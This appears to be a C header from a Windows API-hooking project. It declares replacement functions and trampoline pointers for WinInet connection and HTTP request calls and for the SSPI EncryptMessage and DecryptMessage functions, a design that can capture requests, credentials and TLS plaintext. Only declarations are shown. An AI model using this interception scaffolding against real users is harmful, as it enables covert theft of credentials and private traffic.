#ifndef __HOOK_FUNCS__
#define __HOOK_FUNCS__

#define SECURITY_WIN32

#include <Windows.h>
#include <WinInet.h>
#include <Security.h>
#include "set_hooks.h"
#include "dispatcher.h"

#pragma comment(lib, "secur32")

char msg[MAX_PATH];
LPBYTE _InternetConA;
LPBYTE _InternetConW;
LPBYTE _SendReqA;
LPBYTE _SendReqW;
LPBYTE _OpenReqA;
LPBYTE _OpenReqW;
LPBYTE _Close;
LPBYTE _EncryptMsg;
LPBYTE _DecryptMsg;

HINTERNET hCon;

	

HINTERNET WINAPI _InternetConnectA(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUsername, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext);
HINTERNET WINAPI _InternetConnectW(HINTERNET hInternet, LPCWSTR lpszServerName, INTERNET_PORT nServerPort, LPCWSTR lpszUsername, LPCWSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext);


BOOL WINAPI _HttpSendRequestA(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);
BOOL WINAPI _HttpSendRequestW(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);


HINTERNET WINAPI _HttpOpenRequestA(HINTERNET hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext);
HINTERNET WINAPI _HttpOpenRequestW(HINTERNET hConnect, LPCWSTR lpszVerb, LPCWSTR lpszObjectName, LPCWSTR lpszVersion, LPCWSTR lpszReferrer, LPCWSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext);

BOOL _InternetCloseHandle(HINTERNET hInternet);

SECURITY_STATUS SEC_ENTRY _EncryptMessage(PCtxtHandle phContext, ULONG fQOP, PSecBufferDesc pMessage, ULONG MessageSeqNo);
SECURITY_STATUS SEC_ENTRY _DecryptMessage(PCtxtHandle phContext, PSecBufferDesc pMessage, ULONG MessageSeqNo, PULONG pfQOP);

#endif